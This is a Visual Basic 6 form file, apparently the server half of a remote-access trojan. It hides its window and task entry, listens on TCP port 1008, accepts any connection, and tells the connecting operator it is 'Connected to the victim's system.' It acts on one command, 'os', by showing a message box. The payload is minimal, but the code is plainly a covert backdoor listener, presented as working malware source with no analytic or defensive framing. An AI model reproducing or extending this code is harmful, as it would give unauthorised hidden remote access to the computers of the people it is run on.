VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form frmtr 
   BorderStyle     =   0  'None
   Caption         =   "Form1"
   ClientHeight    =   3195
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   4680
   LinkTopic       =   "Form1"
   ScaleHeight     =   3195
   ScaleWidth      =   4680
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Begin MSWinsockLib.Winsock ws 
      Left            =   600
      Top             =   720
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
End
Attribute VB_Name = "frmtr"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub Form_Load()
App.TaskVisible = False
ws.LocalPort = 1008
ws.Listen
End Sub

Private Sub ws_ConnectionRequest(ByVal requestID As Long)
On Error Resume Next
ws.Accept requestID
DoEvents
ws.SendData "Connected to the victim's system.-R"
DoEvents
End Sub

Private Sub ws_DataArrival(ByVal bytesTotal As Long)
On Error Resume Next
Dim dat As String
ws.GetData dat
If dat = "os" Then
DoEvents
MsgBox "OK connection"
End If
End Sub
